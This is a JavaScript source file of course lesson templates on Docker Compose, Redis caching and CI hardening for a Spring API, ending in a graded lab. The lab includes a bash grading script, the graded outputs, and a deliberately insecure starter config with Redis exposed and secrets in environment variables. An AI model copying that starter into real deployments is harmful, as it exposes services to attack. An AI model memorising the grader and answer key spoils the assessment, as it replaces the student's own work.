  <li>Unit 42 (Palo Alto Networks), "P2PInfect: The Rusty Peer-to-Peer Self-Replicating Worm", July 2023; CVE-2022-0543.</li>
  <li>All measurements: LabFlow compose stack on this course's build machine, November 2026.</li>
</ul>
</div>
`;

const L174_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 17 · Bài 17.4 · Checkpoint</span>
<h2>Checkpoint: cả hệ thống chạy bằng một lệnh</h2>
<p class="lead">Bài kiểm tra cho mọi thứ của chương này: một đồng đội mới clone LabFlow, tạo hai tệp bí mật, gõ một lệnh, và có PostgreSQL, Redis cùng API chạy, đã migrate và healthy — không README mười hai bước, không "à bạn còn phải cài Redis nữa". Checkpoint này dựng tệp compose đó, khởi động từ số 0 (không container, không volume, không image) rồi cố ý làm hỏng nó: Redis chết giữa lúc đang có request. Lần chạy đầu của thí nghiệm đó làm một request treo đúng 60 giây; cách sửa là một thuộc tính.</p>

<h3>Đời thường trước đã</h3>
<p>Hãy nghĩ tới một bộ nội thất giao dạng tháo rời, kèm một tờ hướng dẫn: khung giường không dựng được trước khi lắp xong phần đế, và đội giao hàng kiểm từng món đã chắc chưa rồi mới làm món kế. <code>depends_on</code> với <code>condition: service_healthy</code> là thứ tự đó, healthcheck là bước kiểm "đã chắc chưa", còn <code>docker compose up --wait</code> chỉ trả về khi cả bộ đã đứng vững.</p>

<h3>1. Tệp compose</h3>
${MA174_COMPOSE}
<ul>
  <li><strong>Ba service, một mạng.</strong> Compose tạo mạng <code>sb-c17_default</code>; trong đó <code>db</code> và <code>redis</code> là tên máy (bài 17.2: đừng bao giờ dùng <code>localhost</code>).</li>
  <li><strong>Thứ tự khởi động theo health, không theo "đã bật".</strong> <code>depends_on … condition: service_healthy</code> chờ <code>pg_isready</code> và <code>redis-cli ping</code>. Thiếu điều kiện, API sẽ khởi động khi PostgreSQL còn đang khởi tạo và hỏng ngay lần kết nối đầu.</li>
  <li><strong>Bí mật là tệp.</strong> Image chính thức của PostgreSQL đọc <code>POSTGRES_PASSWORD_FILE</code>; API nhận <code>/run/secrets/LABFLOW_DB_PASSWORD</code> và <code>…/LABFLOW_JWT_SECRET</code>, đọc bằng <code>configtree</code>. Các tệp nằm trong <code>secrets/</code>, thư mục có trong cả <code>.gitignore</code> lẫn <code>.dockerignore</code>.</li>
  <li><strong>Redis là cache, cấu hình đúng kiểu cache</strong>: giới hạn 64 MB, đầy thì bỏ khoá ít dùng nhất, không ghi đĩa. Mất nó không mất gì mà PostgreSQL không có.</li>
  <li><strong>Chỉ API được mở ra ngoài, và chỉ trên 127.0.0.1.</strong> Redis và PostgreSQL không có <code>ports</code>. Cổng Docker mở ra đi vòng qua tường lửa của máy như <code>ufw</code>, nên <code>"6379:6379"</code> trên một máy ảo cloud thật sự nghĩa là "mở cho cả Internet".</li>
  <li><strong>Mọi service đều có giới hạn</strong> (<code>mem_limit</code>, <code>cpus</code>) và <code>stop_grace_period: 40s</code>, dài hơn pha tắt 30 giây của Spring (17.2).</li>
</ul>

<h3>2. Từ số 0, một lệnh</h3>
${OUT174_UP}
<ul>
  <li>22,8 giây từ không có gì tới ba container healthy, gồm cả build image (lớp cache từ 17.1) và năm migration Flyway.</li>
  <li><code>/actuator/health</code> liệt kê <code>db</code> và <code>redis</code> nhờ <code>MANAGEMENT_ENDPOINT_HEALTH_SHOW_COMPONENTS=always</code> — chỉ tên và UP/DOWN, không chi tiết kết nối.</li>
  <li>Trong container API: bí mật là tệp, và <code>env</code> không chứa mật khẩu nào (0). Container CSDL chỉ có <code>POSTGRES_PASSWORD_FILE</code>.</li>
  <li>Bộ nhớ: API 381,8 MiB trên 1 GiB, PostgreSQL 47,55 MiB, Redis 18,9 MiB.</li>
</ul>

<h3>3. Cache, và ngày Redis chết</h3>
<p>Một phương thức của module catalog trong LabFlow được cache (Chương 13 đi sâu vào cache; ở đây nó là lý do Redis có mặt trong hệ thống):</p>
${MA174_CACHE}
<p>Và vì cache không bao giờ được là lý do API hỏng, lỗi của nó được ghi log rồi bỏ qua — Spring sẽ gọi phương thức thật:</p>
${MA174_LOI}
${OUT174_CACHE}
<ul>
  <li>Lần gọi đầu 264 ms (đọc CSDL, rồi lưu vào Redis dưới khoá <code>labflow::lab::AI-03</code> với TTL 600 giây), lần hai 18 ms.</li>
  <li><strong>Redis dừng: request mất 60,0 giây.</strong> Nó vẫn thành công (bộ xử lý lỗi quay về PostgreSQL), nhưng chỉ sau khi client Redis bỏ cuộc. Lettuce, client mà Spring Boot dùng, mặc định chờ một lệnh tới 60 giây và xếp hàng lệnh trong lúc thử kết nối lại. Dưới tải thật, mọi request giữ một luồng Tomcat cả phút — API vẫn "sống" mà vô dụng.</li>
  <li><strong>Cách sửa là một thuộc tính</strong>: <code>spring.data.redis.timeout=500ms</code> (ở đây đặt qua môi trường thành <code>SPRING_DATA_REDIS_TIMEOUT</code> — lại là relaxed binding). Cùng thí nghiệm: 517 ms, rồi 515 ms, rồi 16 ms khi Redis sống lại. LabFlow giờ đặt nó trong <code>application.properties</code>.</li>
  <li>Endpoint health nói thật (<code>redis=DOWN</code>, tổng <code>DOWN</code>) trong khi readiness vẫn <code>UP</code> — đúng cách chia đã thiết kế ở 17.2.</li>
</ul>
<div class="callout warn"><p><strong>Luật rút ra từ thí nghiệm:</strong> mọi lời gọi qua mạng đều có thời hạn chờ do bạn chọn — CSDL (<code>connection-timeout</code> của Hikari), client HTTP, Redis, message broker. Giá trị mặc định được viết cho "chạy được trong demo", không phải "hỏng nhanh trên production".</p></div>

<h3>4. Cái gì (không) mở ra ngoài, và cái gì còn sau khi khởi động lại</h3>
${OUT174_PORT}
${OUT174_LAI}
<p><code>docker compose down</code> xoá container và mạng nhưng giữ volume có tên <code>db-data</code>: lần <code>up</code> sau mất 14,1 giây, Flyway thấy 5 dòng lịch sử và báo "No migration necessary". Chỉ <code>down -v</code> mới xoá dữ liệu — tiện cho "từ số 0" trong CI và nguy hiểm ở mọi nơi khác.</p>

<h3>5. Cũng Redis đó trong test</h3>
<p>Thêm Redis vào ứng dụng nghĩa là bộ test cũng cần một cái, nếu không mọi lời gọi có cache trong test sẽ phải chờ hết thời hạn. Thêm một container cạnh PostgreSQL trong interface Testcontainers dùng chung của Chương 18; <code>@ServiceConnection(name = "redis")</code> tự đặt <code>spring.data.redis.host/port</code>:</p>
${MA174_TC}
<p>Trong các lượt CI của 17.3, log có cả hai: <code>postgres:16 started in 3.6 s</code>, <code>redis:7-alpine started in 1.1 s</code>, 16 test xanh.</p>

<h3>🕵️ Góc hacker — P2PInfect và Redis để ngỏ, 2023</h3>
<p>Tháng 7/2023, Unit 42 (Palo Alto Networks) công bố P2PInfect, một con sâu viết bằng Rust lây qua các máy chủ Redis gọi được từ Internet — họ đếm được hơn 300 000 Redis để ngỏ. Nó dùng tính năng nhân bản của Redis và một lỗi thoát sandbox Lua đã biết (CVE-2022-0543) để chạy mã trên máy, rồi quét tìm nạn nhân kế. Nhiều Redis trong số đó vốn không định công khai: một dòng <code>ports: - "6379:6379"</code> chép từ bài hướng dẫn lên máy ảo cloud, nơi cổng Docker mở ra đi vòng qua tường lửa. Cách LabFlow phòng là từ cấu trúc: Redis hoàn toàn không mở cổng, có giới hạn bộ nhớ, và API chỉ gắn vào 127.0.0.1 (một reverse proxy đứng ra đón Internet).</p>

<h3>So với Node.js</h3>
<p>Khoá Node.js chạy đúng bộ ba này (API Node + PostgreSQL + Redis) bằng compose; tệp có cùng hình dáng. Hai dòng riêng của Java: healthcheck cần <code>curl</code> trong image (image Node hay dùng một lệnh nhỏ <code>node -e "fetch(…)"</code> thay thế), và <code>mem_limit</code> của API phải khớp cấu hình heap của JVM (17.2). Cái bẫy thời hạn chờ Redis cũng có ở Node — <code>ioredis</code> mặc định cũng xếp hàng lệnh khi đang kết nối lại.</p>

<h3>Khi đi làm</h3>
<p>Tệp compose này là thứ bạn đưa cho bạn làm frontend và bạn tester ngay ngày đầu SWP391: "clone, tạo <code>secrets/</code>, <code>docker compose up -d --wait</code>". Nếu cần hơn một lệnh, mỗi người trong nhóm sẽ dựng một kiểu hơi khác nhau và mất cả ngày vì "nhưng máy em…". Để nó ở gốc repo, giữ nó xanh trong CI (17.5), và coi một lần <code>compose up</code> hỏng như một lần build hỏng.</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Làm sao chắc API chỉ khởi động khi CSDL đã sẵn sàng?"</strong> — Healthcheck cho các phụ thuộc cộng <code>depends_on: condition: service_healthy</code>; healthcheck của chính API theo readiness; <code>up --wait</code> trong script. Và ứng dụng vẫn nên thử kết nối lại, vì trên production thứ tự không được bảo đảm.</li>
  <li><strong>"Redis sập. API của bạn ra sao?"</strong> — Có <code>CacheErrorHandler</code> thì lời gọi quay về CSDL. Không có thời hạn chờ, mỗi request treo tới khi client bỏ cuộc (đo được: 60 giây); với <code>spring.data.redis.timeout=500ms</code> chỉ mất nửa giây. Health báo Redis DOWN; readiness vẫn UP.</li>
  <li><strong>"Sao không mở cổng Redis và PostgreSQL trong compose?"</strong> — Chỉ API cần được gọi tới; cổng mở ra đi vòng qua tường lửa của máy và mời những cuộc tấn công như P2PInfect. Gỡ lỗi ở máy thì chỉ mở trên <code>127.0.0.1</code>, hoặc dùng <code>docker compose exec</code>.</li>
  <li><strong>"<code>compose down</code> khác <code>down -v</code> thế nào?"</strong> — <code>down</code> xoá container và mạng; volume có tên (CSDL) còn nguyên. <code>-v</code> xoá volume — dữ liệu mất.</li>
</ol>

<h3>🧪 Thực hành (30 phút)</h3>
<div class="callout ok"><ol>
  <li>Khởi động hệ thống từ số 0 và bấm giờ. Rồi bỏ <code>condition: service_healthy</code> khỏi <code>depends_on</code> của API, chạy <code>down -v</code> rồi <code>up</code> lại vài lần. Ở những lần API thua cuộc đua, nó ghi log gì?</li>
  <li>Khi hệ thống đang chạy, dừng Redis và gọi <code>/api/v1/labs/HW-04</code> hai lần: một lần với thời hạn chờ Redis mặc định, một lần với <code>500ms</code>. Rồi bỏ bean <code>CacheErrorHandler</code> và làm lại. Client nhận mã trạng thái gì?</li>
  <li>Đổi Redis thành <code>ports: ["6379:6379"]</code>, chạy <code>ss -ltn</code>, rồi đổi thành <code>"127.0.0.1:6379:6379"</code>. Địa chỉ đang nghe khác nhau thế nào?</li>
</ol></div>
${giai('Xem đáp án', `<p>1. Có lần API khởi động trước khi PostgreSQL nhận kết nối: Hikari ghi <code>Connection to db:5432 refused</code>, Flyway hỏng, ứng dụng thoát mã 1 và <code>up --wait</code> báo API đã thoát. Đó là một cuộc đua: phụ thuộc PostgreSQL khởi tạo volume mới nhanh hay chậm. Điều kiện health xoá cuộc đua đó.</p><p>2. Mặc định: khoảng 60 giây rồi 200 (bộ xử lý lỗi quay về CSDL). 500 ms: khoảng 0,5 giây rồi 200. Không có bộ xử lý lỗi, <code>QueryTimeoutException</code> (hoặc <code>RedisConnectionFailureException</code>) lên tới controller và bộ bắt lỗi chung của LabFlow biến nó thành ProblemDetail 500 — cache sập đã thành API sập.</p><p>3. <code>0.0.0.0:6379</code> (và <code>[::]:6379</code>): mọi card mạng, máy nào định tuyến được tới máy này đều gọi được Redis — Docker tự thêm luật iptables, nên tường lửa của máy không chặn. Có tiền tố: <code>127.0.0.1:6379</code>, chỉ máy này.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<ul>
  <li><strong>Compose project</strong> — tập service, mạng và volume trong một tệp compose; đặt tên bằng <code>name:</code> hoặc <code>-p</code>.</li>
  <li><strong><code>depends_on: condition: service_healthy</code></strong> — chỉ khởi động một service sau khi healthcheck của service kia qua.</li>
  <li><strong><code>up --wait</code></strong> — chỉ trả về khi các service đang chạy/healthy; hỏng nếu có cái không lên.</li>
  <li><strong>Volume có tên</strong> — vùng lưu trữ do Docker quản lý, còn sau <code>down</code>; bị xoá bởi <code>down -v</code>.</li>
  <li><strong>Secret của Compose</strong> — tệp được gắn vào <code>/run/secrets/&lt;tên&gt;</code> thay cho biến môi trường.</li>
  <li><strong>CacheErrorHandler</strong> — móc của Spring quyết định chuyện gì xảy ra khi chính cache hỏng.</li>
  <li><strong>Thời hạn chờ lệnh (command timeout)</strong> — client Redis chờ trả lời bao lâu (<code>spring.data.redis.timeout</code>).</li>
</ul>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Một lệnh, từ số 0: PostgreSQL + Redis + API healthy sau 22,8 giây; khởi động lại giữ dữ liệu sau 14,1 giây.</li>
  <li>Thứ tự theo health, bí mật là tệp, chỉ API mở ra ngoài và chỉ trên 127.0.0.1, service nào cũng có giới hạn.</li>
  <li>Trúng cache 18 ms so với 264 ms. Redis sập: thời hạn mặc định của client ⇒ 60 giây mỗi request; <code>spring.data.redis.timeout=500ms</code> ⇒ 0,5 giây; bộ xử lý lỗi giữ câu trả lời đúng.</li>
  <li>Test có Redis riêng qua Testcontainers; CI vẫn xanh.</li>
  <li>Đừng bao giờ mở Redis ra thế giới — P2PInfect, 2023.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://docs.docker.com/compose/how-tos/startup-order/', '🚦', 'Docker Compose — Thứ tự khởi động', 'Điều kiện depends_on, healthcheck.')}
${tl('https://docs.docker.com/compose/how-tos/use-secrets/', '🔑', 'Docker Compose — Secrets', 'Secret dạng tệp, quy ước _FILE.')}
${tl('https://docs.spring.io/spring-boot/reference/io/caching.html', '⚡', 'Spring Boot — Caching', 'Cache Redis, TTL, tiền tố khoá.')}
${tl('https://unit42.paloaltonetworks.com/peer-to-peer-worm-p2pinfect/', '🕵️', 'Unit 42 — P2PInfect', 'Con sâu lây qua Redis để ngỏ.')}

<h3>Nguồn</h3>
<ul>
  <li>Unit 42 (Palo Alto Networks), "P2PInfect: The Rusty Peer-to-Peer Self-Replicating Worm", 07/2023; CVE-2022-0543.</li>
  <li>Mọi số đo: hệ thống compose LabFlow trên máy dựng bài của khoá, tháng 11/2026.</li>
</ul>
</div>
`;

// ===== Bài 17.5 =====
const MA175_DF = bash("# Dockerfile (bản khởi đầu)\nFROM maven:3.9-eclipse-temurin-21\nWORKDIR /app\nCOPY . .\nRUN mvn -B -q -DskipTests package\nEXPOSE 8080\nCMD java -jar target/labflow-api-1.0.0.jar");
const MA175_COMPOSE = yml("# bản của nhóm: \"chạy được trên máy em\" — bí mật lấy từ .env\nservices:\n  db:\n    image: postgres:16\n    environment:\n      POSTGRES_DB: labflow\n      POSTGRES_USER: labflow\n      POSTGRES_PASSWORD: ${DB_PASSWORD}\n  redis:\n    image: redis:7-alpine\n    ports:\n      - \"6379:6379\"\n  api:\n    build: .\n    depends_on: [db, redis]\n    environment:\n      LABFLOW_DB_PASSWORD: ${DB_PASSWORD}\n      LABFLOW_JWT_SECRET: ${JWT_SECRET}\n      LABFLOW_REDIS_HOST: redis\n      SPRING_PROFILES_ACTIVE: dev\n    ports:\n      - \"${LABFLOW_PORT:-8080}:8080\"");
const MA175_CI = yml("# .github/workflows/ci.yml (bản khởi đầu)\nname: ci\non: [push, pull_request]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-java@v4\n        with:\n          distribution: temurin\n          java-version: \"21\"\n      - run: mvn verify");
const MA175_CHAM = bash("#!/bin/bash\n# cham.sh <thư mục dự án> — chấm Lab 17 (đóng gói + CI cho LabFlow). In 10 mục ĐẠT/TRƯỢT và điểm.\n# Hợp đồng của đề: Dockerfile + compose.yaml (service db, redis, api) ở gốc dự án; bí mật đọc từ secrets/db_password.txt\n# và secrets/jwt_secret.txt; API mở ở 127.0.0.1:${LABFLOW_PORT:-8080}; /actuator/health cho thấy thành phần db và redis;\n# workflow ở .github/workflows/ci.yml. Bộ chấm chép dự án sang thư mục tạm, sinh bí mật ngẫu nhiên (cả .env lẫn secrets/),\n# build bằng docker compose (project sb-c17-cham-<pid>), dựng từ số 0 rồi dọn sạch. Chạy TRONG khoá nặng.\nset -u\nSRC=$(realpath \"$1\"); W=~/.rtq-sb/c17/cham/$(basename \"$SRC\")-$$; P=sb-c17-cham-$$; PORT=41873; IMG=$P-api\nMKDB=$(openssl rand -hex 10); JWT=$(openssl rand -hex 32)\ndiem=0; muc() { if [ \"$2\" = 1 ]; then diem=$((diem+1)); echo \"Mục $1: ĐẠT   — $3\"; else echo \"Mục $1: TRƯỢT — $3\"; fi; }\n# Lúc chấm KHÔNG BAO GIỜ mở cổng ra ngoài máy: tệp override gỡ mọi \"ports\" của db/redis và gắn api vào 127.0.0.1:$PORT.\n# Mục 7 kiểm cổng trên tệp compose GỐC của bài (docker compose config), không cần thật sự mở cổng.\nOV=~/.rtq-sb/c17/cham/override-$$.yaml\ndc() { LABFLOW_PORT=$PORT docker compose -p $P -f compose.yaml -f $OV \"$@\"; }\ndon() { cd /; (cd \"$W\" 2>/dev/null && dc down -v --rmi local >/dev/null 2>&1); rm -f $OV; docker rm -f $P-xem >/dev/null 2>&1; docker image rm -f $IMG >/dev/null 2>&1; rm -rf \"$W\"; }\ntrap don EXIT\nrm -rf \"$W\"; mkdir -p \"$W\"; cp -r \"$SRC\"/. \"$W\"/; rm -rf \"$W/target\" \"$W/secrets\" \"$W/.env\"; cd \"$W\"\nmkdir -p secrets; printf '%s' \"$MKDB\" > secrets/db_password.txt; printf '%s' \"$JWT\" > secrets/jwt_secret.txt; chmod 644 secrets/*\nprintf 'DB_PASSWORD=%s\\nJWT_SECRET=%s\\n' \"$MKDB\" \"$JWT\" > .env   # bản khởi đầu đọc .env; bản tốt không cần\nprintf 'services:\\n  db:\\n    ports: !reset []\\n  redis:\\n    ports: !reset []\\n  api:\\n    ports: !override [\"127.0.0.1:%s:8080\"]\\n' $PORT > $OV\n\n# ---- Mục 1: build được image của service api\na=$(date +%s); timeout 900 bash -c \"LABFLOW_PORT=$PORT docker compose -p $P -f compose.yaml -f $OV build api\" > build.log 2>&1; r=$?; t=$(( $(date +%s)-a ))\ndocker image inspect $IMG >/dev/null 2>&1 || r=1\nmuc 1 $([ $r = 0 ] && echo 1 || echo 0) \"docker compose build api: $([ $r = 0 ] && echo \"xong sau $t s\" || echo \"hỏng (xem build.log)\")\"\n[ $r = 0 ] || { echo \"Điểm: $diem/10\"; exit 0; }\n\n# ---- Mục 2: image gọn và chia lớp (lớp trên cùng có nội dung ≤ 5 MB, cả image ≤ 800 MB)\nco=$(docker image inspect -f '{{.Size}}' $IMG); mb=$((co/1000000))\nlop=$(docker history --no-trunc --format '{{.Size}}' $IMG | grep -v '^0B$' | head -1)\nlopb=$(echo \"$lop\" | awk '{v=$1+0; u=$1; gsub(/[0-9.]/,\"\",u); m=(u==\"kB\"?1e3:(u==\"MB\"?1e6:(u==\"GB\"?1e9:1))); printf \"%d\", v*m}')\nmuc 2 $([ $mb -le 300 ] && [ $lopb -le 5000000 ] && echo 1 || echo 0) \"image ${mb} MB; lớp có nội dung trên cùng: $lop\"\n\n# ---- Mục 3: không chạy bằng root\nu=$(docker image inspect -f '{{.Config.User}}' $IMG)\nmuc 3 $(case \"$u\" in \"\"|0|root|0:0|root:root) echo 0;; *) echo 1;; esac) \"USER của image: '${u:-trống = root}'\"\n\n# ---- Mục 4: không rác, không bí mật trong image (.env, .git, secrets/, giá trị bí mật trong lịch sử)\ndocker create --name $P-xem $IMG >/dev/null 2>&1\nrac=$(docker export $P-xem | tar -t 2>/dev/null | grep -cE '(^|/)\\.env$|(^|/)\\.git/|(^|/)secrets/')\nls=$(docker history --no-trunc --format '{{.CreatedBy}}' $IMG | grep -cE \"$MKDB|$JWT\")\nmuc 4 $([ $rac = 0 ] && [ $ls = 0 ] && echo 1 || echo 0) \"tệp .env/.git/secrets trong image: $rac; bí mật trong lịch sử image: $ls\"\n\n# ---- Mục 5: cả hệ thống lên bằng một lệnh, từ số 0, trong ≤ 240 s; api có healthcheck và \"healthy\"\na=$(date +%s); timeout 240 bash -c \"LABFLOW_PORT=$PORT docker compose -p $P -f compose.yaml -f $OV up -d --wait --no-build\" > up.log 2>&1; r=$?; t=$(( $(date +%s)-a ))\nc=$(dc ps -aq api 2>/dev/null | head -1); hs=$([ -n \"$c\" ] && docker inspect -f '{{if .State.Health}}{{.State.Health.Status}}{{else}}không có healthcheck{{end}}' $c)\nmuc 5 $([ $r = 0 ] && [ \"$hs\" = healthy ] && echo 1 || echo 0) \"up -d --wait: $([ $r = 0 ] && echo \"xong sau $t s\" || echo \"hỏng/quá 240 s\"); api: ${hs:-không có container}\"\n[ \"$hs\" = healthy ] || sleep 15\n\n# ---- Mục 6: /actuator/health UP, có db và redis UP\nh=$(curl -s --max-time 5 localhost:$PORT/actuator/health)\nok=$(echo \"$h\" | jq -r '[.status, .components.db.status, .components.redis.status] | join(\",\")' 2>/dev/null)\nmuc 6 $([ \"$ok\" = \"UP,UP,UP\" ] && echo 1 || echo 0) \"health (tổng,db,redis) = ${ok:-không gọi được}\"\n\n# ---- Mục 7: tệp compose GỐC không mở db/redis ra máy chủ, và api chỉ mở trên 127.0.0.1\ncf=$(LABFLOW_PORT=$PORT docker compose -p $P -f compose.yaml config --format json 2>/dev/null)\nmo=$(echo \"$cf\" | jq -r '[.services.db.ports // [], .services.redis.ports // [] | .[] | \"\\(.host_ip // \"0.0.0.0\"):\\(.published)\"] | join(\" \")')\napi=$(echo \"$cf\" | jq -r '[.services.api.ports // [] | .[] | (.host_ip // \"0.0.0.0\")] | unique | join(\" \")')\nmuc 7 $([ -z \"$mo\" ] && [ \"$api\" = 127.0.0.1 ] && echo 1 || echo 0) \"cổng db/redis mở ra máy chủ: ${mo:-không có}; api gắn vào: ${api:-không mở}\"\n\n# ---- Mục 8: không bí mật trong cấu hình container (docker inspect)\nn=0\n[ -n \"$c\" ] && n=$(docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $c | grep -cE \"$MKDB|$JWT\")\nmuc 8 $([ -n \"$c\" ] && [ $n = 0 ] && echo 1 || echo 0) \"giá trị bí mật trong docker inspect của api: $([ -n \"$c\" ] && echo $n || echo 'không có container')\"\n\n# ---- Mục 9: tắt êm — docker stop < 10 s, exit 143 (Java là PID 1, nhận SIGTERM)\nif [ -n \"$c\" ]; then a=$(date +%s.%N); docker stop $c >/dev/null; t=$(echo \"$(date +%s.%N) - $a\" | bc); ec=$(docker inspect -f '{{.State.ExitCode}}' $c)\n  muc 9 $([ \"$ec\" = 143 ] && [ $(echo \"$t < 10\" | bc) = 1 ] && echo 1 || echo 0) \"docker stop: $(printf '%.1f' $t) s, exit $ec\"\nelse muc 9 0 \"không có container api\"; fi\n\n# ---- Mục 10: CI — actionlint sạch, mọi action ghim SHA 40 ký tự, có permissions ở đầu tệp\nF=.github/workflows/ci.yml\nif [ -f $F ]; then\n  docker run --rm --memory 256m -v \"$W/.github/workflows\":/w:ro -w /w rhysd/actionlint:latest -color=false ci.yml > lint.log 2>&1; al=$?\n  khong=$(grep -E '^\\s*-?\\s*uses:' $F | grep -vcE '@[0-9a-f]{40}(\\s|$)'); pm=$(grep -c '^permissions:' $F)\n  muc 10 $([ $al = 0 ] && [ $khong = 0 ] && [ $pm -ge 1 ] && echo 1 || echo 0) \"actionlint exit $al; action chưa ghim SHA: $khong; permissions đầu tệp: $pm\"\nelse muc 10 0 \"không có $F\"; fi\necho \"Điểm: $diem/10\"");
const OUT175_STARTER = out("$ bash cham.sh ./labflow-starter\nMục 1: ĐẠT   — docker compose build api: xong sau 68 s\nMục 2: TRƯỢT — image 448 MB; lớp có nội dung trên cùng: 239MB\nMục 3: TRƯỢT — USER của image: 'trống = root'\nMục 4: TRƯỢT — tệp .env/.git/secrets trong image: 4; bí mật trong lịch sử image: 0\nMục 5: TRƯỢT — up -d --wait: xong sau 1 s; api: không có healthcheck\nMục 6: TRƯỢT — health (tổng,db,redis) = không gọi được\nMục 7: TRƯỢT — cổng db/redis mở ra máy chủ: 0.0.0.0:6379; api gắn vào: 0.0.0.0\nMục 8: TRƯỢT — giá trị bí mật trong docker inspect của api: 2\nMục 9: TRƯỢT — docker stop: 0.0 s, exit 1\nMục 10: TRƯỢT — actionlint exit 0; action chưa ghim SHA: 2; permissions đầu tệp: 0\nĐiểm: 1/10");
const OUT175_GIAI = out("$ bash cham.sh ./labflow-giai\nMục 1: ĐẠT   — docker compose build api: xong sau 4 s\nMục 2: ĐẠT   — image 196 MB; lớp có nội dung trên cùng: 295kB\nMục 3: ĐẠT   — USER của image: 'labflow'\nMục 4: ĐẠT   — tệp .env/.git/secrets trong image: 0; bí mật trong lịch sử image: 0\nMục 5: ĐẠT   — up -d --wait: xong sau 20 s; api: healthy\nMục 6: ĐẠT   — health (tổng,db,redis) = UP,UP,UP\nMục 7: ĐẠT   — cổng db/redis mở ra máy chủ: không có; api gắn vào: 127.0.0.1\nMục 8: ĐẠT   — giá trị bí mật trong docker inspect của api: 0\nMục 9: ĐẠT   — docker stop: 0.5 s, exit 143\nMục 10: ĐẠT   — actionlint exit 0; action chưa ghim SHA: 0; permissions đầu tệp: 1\nĐiểm: 10/10");

const L175_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 17 · Lesson 17.5 · Lab</span>
<h2>Chapter 17 lab + interview questions</h2>
<p class="lead">Your SWP391 team has a LabFlow repository that "works on my machine": a Dockerfile copied from a tutorial, a compose file that reads passwords from <code>.env</code>, Redis published "so I can look at it", and a CI workflow written in five minutes. Your task is to make it shippable. A grading script runs the same checks a senior reviewer would — on a clean copy, from zero, with random secrets — and prints 10 PASS/FAIL lines. The starter scores 1/10 (measured below); the reference solution scores 10/10 (hidden). Expected time: 2–3 hours.</p>

<h3>The starting point</h3>
${MA175_DF}
${MA175_COMPOSE}
${MA175_CI}

<h3>The contract (what the grader assumes)</h3>
<ul>
  <li><code>Dockerfile</code> and <code>compose.yaml</code> at the project root; compose has services <code>db</code>, <code>redis</code>, <code>api</code>.</li>
  <li>Secrets are read from <code>secrets/db_password.txt</code> and <code>secrets/jwt_secret.txt</code> (the grader creates them with random values; it also writes a <code>.env</code>, because the starter needs one — a good solution ignores it).</li>
  <li>The API is published only on <code>127.0.0.1:\${LABFLOW_PORT:-8080}</code>; <code>/actuator/health</code> shows the <code>db</code> and <code>redis</code> components.</li>
  <li>The workflow is <code>.github/workflows/ci.yml</code>.</li>
  <li>You may change anything else, including LabFlow's code and <code>application.properties</code>.</li>
</ul>

<h3>The grader</h3>
<p>It copies your project to a temporary folder, builds with <code>docker compose</code> under its own project name, starts everything from zero, and cleans up at the end. While grading it never opens a port to the outside: an override file removes every <code>ports</code> of <code>db</code>/<code>redis</code> and binds the API to <code>127.0.0.1</code> — item 7 reads your <em>original</em> compose file with <code>docker compose config</code> instead. (That override exists because the first version of this grader really opened the starter's Redis on <code>0.0.0.0:6379</code> on the build machine for a few seconds. Graders deserve the same care as production.)</p>
${MA175_CHAM}
<p>The starter, graded for real:</p>
${OUT175_STARTER}
<p>Notice item 5 of the starter: <code>up --wait</code> "succeeded" after 1 second — without healthchecks, compose only waits for containers to <em>start</em>, and the API died a few seconds later trying <code>localhost:5432</code>. That is why the grader also requires the API to report <code>healthy</code>. And item 1 passing tells you little: building is the easy part.</p>

<h3>Steps (each points to the lesson that has the answer)</h3>
<ol>
  <li><strong>Image</strong> (items 1–4): multi-stage, layered jar, JRE base, <code>USER</code> with a numeric uid, <code>.dockerignore</code> — lesson 17.1.</li>
  <li><strong>Configuration and secrets</strong> (items 6, 8): DB URL by service name, secrets as files with <code>configtree</code> and <code>POSTGRES_PASSWORD_FILE</code>, health components visible — lessons 17.2 and 17.4.</li>
  <li><strong>Startup and shutdown</strong> (items 5, 9): healthchecks on all three services, <code>depends_on … service_healthy</code>, exec-form <code>ENTRYPOINT</code> — lessons 17.2 and 17.4.</li>
  <li><strong>Network</strong> (item 7): nothing published except the API on <code>127.0.0.1</code> — lesson 17.4.</li>
  <li><strong>CI</strong> (item 10): top-level <code>permissions</code>, every action pinned to a 40-character SHA, passes actionlint — lesson 17.3. Get the SHAs yourself with <code>git ls-remote</code>; do not copy them from anywhere you have not checked.</li>
</ol>

<h3>Rubric</h3>
<table>
  <thead><tr><th>Part</th><th>Items</th><th>Points</th></tr></thead>
  <tbody>
    <tr><td>Image: builds, layered and small, not root, no junk or secrets</td><td>1–4</td><td>4</td></tr>
    <tr><td>Whole stack from zero, healthy, health shows db + redis</td><td>5–6</td><td>2</td></tr>
    <tr><td>Nothing exposed, no secret in the container config</td><td>7–8</td><td>2</td></tr>
    <tr><td>Graceful shutdown</td><td>9</td><td>1</td></tr>
    <tr><td>CI hardened and lint-clean</td><td>10</td><td>1</td></tr>
    <tr><td><em>Review (by a teammate, not the script)</em>: a README section "run it in one command", secrets documented but not committed, a PR description explaining each change</td><td>—</td><td>pass/fail</td></tr>
  </tbody>
</table>

${giai('Show the reference solution (try first!)', `<p>The reference solution is exactly the files built in this chapter: the Dockerfile and <code>.dockerignore</code> of 17.1 (plus <code>secrets/</code> in <code>.dockerignore</code>), the compose file of 17.4 with the API port written as <code>"127.0.0.1:\${LABFLOW_PORT:-8080}:8080"</code> and without a fixed <code>image:</code> name, and the workflow of 17.3. LabFlow's code needed no change except <code>spring.data.redis.timeout=500ms</code> (17.4). Graded for real:</p>${OUT175_GIAI}<p>If you are stuck on one item: 2 fails on size ⇒ check you are not copying Maven or the JDK into the last stage; 4 fails ⇒ <code>docker create</code> + <code>docker export | tar -t</code> shows what is inside; 5 fails ⇒ <code>docker compose ps</code> and the API log; 9 shows exit 137 ⇒ PID 1 is a shell.</p>`)}

<h3>🕵️ Hacker corner — Docker Hub, April 2019</h3>
